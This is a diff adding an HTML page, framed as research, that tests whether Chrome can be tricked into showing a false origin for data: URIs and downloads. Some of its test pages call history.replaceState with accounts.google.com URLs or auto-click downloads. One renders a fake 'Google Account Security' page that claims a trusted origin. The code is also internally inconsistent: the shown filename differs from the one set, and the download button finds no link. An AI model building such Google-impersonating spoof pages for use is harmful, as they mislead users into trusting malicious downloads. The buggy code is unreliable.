@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Data URI Origin Spoof Research</title>
+    <style>
+        body {
+            font-family: monospace;
+            padding: 20px;
+            background: #0a0a1a;
+            color: #eee;
+        }
+
+        .box {
+            background: #16213e;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+
+        .vuln {
+            background: #c0392b;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        .safe {
+            background: #27ae60;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        .warn {
+            background: #f39c12;
+            color: black;
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        button {
+            background: #8e44ad;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+
+        button:hover {
+            background: #6c3483;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>🔬 Research: Data URI Origin Spoofing</h1>
+
+    <div class="box">
+        <h3>🧪 Test: Data URI with Fake Origin</h3>
+        <p><strong>Goal:</strong> Create a data URI that Chrome thinks originated from a different domain</p>
+
+        <button onclick="testDataURISpoof()">📤 Test Data URI Spoof</button>
+        <button onclick="testBase64Spoof()">🔢 Test Base64 Spoof</button>
+        <button onclick="testHTMLDataURI()">📄 Test HTML Data URI</button>
+
+        <div id="results"></div>
+    </div>
+
+    <script>
+        function testDataURISpoof() {
+            const results = document.getElementById('results');
+
+            // Create a data URI with a filename that suggests a different origin
+            const data = 'This is a test file with spoofed origin';
+            const base64 = btoa(data);
+            const dataURI = `data:application/pdf;base64,${base64}`;
+
+            // Try to spoof the origin by creating a link with a download attribute
+            const link = document.createElement('a');
+            link.href = dataURI;
+            link.download = 'blob:https://github.com/13c6881d-c013-46e5-abea-b161667503fe';
+
+            results.innerHTML = `
+                <div class="box">
+                    <p><strong>Test:</strong> Data URI with spoofed filename</p>
+                    <p><strong>Filename:</strong> <code>accounts.google.com_secure_document.pdf</code></p>
+                    <p><strong>Expected:</strong> Chrome might show "accounts.google.com" as the origin</p>
+                    <button onclick="downloadLink(this.previousElementSibling)">⬇️ Download</button>
+                    <div class="research-note">
+                        <p>🔍 <strong>Research Question:</strong> Does the download dialog show "From accounts.google.com"?</p>
+                        <p>💡 <strong>Hypothesis:</strong> Chrome might extract the domain from the filename</p>
+                    </div>
+                </div>
+            `;
+        }
+
+        function testBase64Spoof() {
+            const results = document.getElementById('results');
+
+            // Create a base64 encoded HTML page with a download
+            const html = `
+                <html>
+                    <head><title>Download Page</title></head>
+                    <body>
+                        <h1>Download from trusted source</h1>
+                        <a href="data:text/plain,This is from a trusted source" download="trusted-file.pdf">Download</a>
+                        <script>
+                            // Try to change the URL
+                            history.replaceState(null, '', 'https://accounts.google.com/');
+                            // Auto-click download
+                            setTimeout(() => {
+                                document.querySelector('a').click();
+                            }, 500);
+                        <\/script>
+                    </body>
+                </html>
+            `;
+
+            const base64 = btoa(html);
+            const dataURI = `data:text/html;base64,${base64}`;
+
+            results.innerHTML += `
+                <div class="box" style="border-left: 3px solid #8e44ad;">
+                    <p><strong>Test:</strong> Base64 HTML with history.replaceState</p>
+                    <p><strong>Goal:</strong> Make the download appear from "accounts.google.com"</p>
+                    <a href="${dataURI}" target="_blank">📄 Open Spoofed Page</a>
+                    <div class="research-note">
+                        <p>🔍 <strong>Research Question:</strong> When you open this page, what does the address bar show?</p>
+                        <p>📝 <strong>Note:</strong> In modern Chrome, history.replaceState is blocked on about:blank and data: URIs</p>
+                    </div>
+                </div>
+            `;
+        }
+
+        function testHTMLDataURI() {
+            const results = document.getElementById('results');
+
+            // Create an HTML page that tries to spoof the origin
+            const spoofedPage = `
+                <html>
+                    <head>
+                        <title>Trusted Document</title>
+                        <style>
+                            body { font-family: Arial; padding: 50px; background: white; }
+                            h1 { color: #1a73e8; }
+                            .trusted { border: 2px solid #34a853; padding: 20px; border-radius: 10px; }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="trusted">
+                            <h1>🔒 Google Account Security</h1>
+                            <p>This document is from a trusted source</p>
+                            <p><strong>Origin:</strong> accounts.google.com</p>
+                            <hr>
+                            <button onclick="downloadFile()">⬇️ Download Secure Document</button>
+                        </div>
+                        
+                        <script>
+                            function downloadFile() {
+                                const link = document.createElement('a');
+                                link.href = 'data:text/plain,This is a secure document';
+                                link.download = 'google-security-report.pdf';
+                                link.click();
+                                
+                                // Try to log the current URL for research
+                                console.log('Current URL:', window.location.href);
+                                console.log('Current origin:', window.location.origin);
+                            }
+                            
+                            // Try to spoof the URL
+                            try {
+                                history.replaceState({}, '', 'https://accounts.google.com/secure-doc');
+                            } catch(e) {
+                                console.log('URL spoofing blocked:', e.message);
+                            }
+                        <\/script>
+                    </body>
+                </html>
+            `;
+
+            const encoded = encodeURIComponent(spoofedPage);
+            const dataURI = `data:text/html;charset=utf-8,${encoded}`;
+
+            results.innerHTML += `
+                <div class="box" style="border-left: 3px solid #e74c3c;">
+                    <p><strong>Test:</strong> Full HTML Page with Origin Spoof</p>
+                    <p><strong>Goal:</strong> Create a page that looks like Google and tries to spoof the origin</p>
+                    <a href="${dataURI}" target="_blank" style="color: #3498db; text-decoration: underline;">🌐 Open Spoofed Google Page</a>
+                    <div class="research-note" style="background: #1a1a3e; padding: 10px; margin-top: 10px;">
+                        <p>🔍 <strong>Research Questions:</strong></p>
+                        <ul>
+                            <li>What does the address bar show in the new window?</li>
+                            <li>What does the download dialog show for "From"?</li>
+                            <li>Can the user tell this is a spoof?</li>
+                        </ul>
+                        <p>📝 <strong>Document:</strong> Take screenshots of the download dialog</p>
+                    </div>
+                </div>
+            `;
+        }
+
+        function downloadLink(button) {
+            // Find the link in the same container
+            const container = button.parentElement;
+            const link = container.querySelector('a');
+            if (link) {
+                link.click();
+            }
+        }
+
+        // Research logging
+        console.log('🔬 Researching data URI origin spoofing');
+        console.log('📝 Current protocol:', window.location.protocol);
+        console.log('📝 Current origin:', window.location.origin);
+    </script>
+</body>
+
+</html>
